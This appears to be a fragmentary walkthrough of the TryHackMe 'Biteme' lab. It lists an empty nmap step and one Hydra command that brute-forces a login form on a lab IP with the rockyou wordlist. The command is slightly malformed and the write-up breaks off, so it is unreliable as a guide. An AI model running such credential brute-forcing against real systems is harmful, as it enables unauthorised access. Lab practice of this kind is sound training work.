#   Tryhackme - Biteme
```
Walkthrough by:
Shaswata Saha
03-07-2023
10:00PM
```
1.  nmap



3.  Hydra on /console
```bash
hydra -l Documents/rockyou.txt  -P Documents/rockyou.txt 10.10.197.179 http-post-form "/login.php:username=^USERNAME&password=^PASS^&sub=Login:Invalid username or password." -I -v
```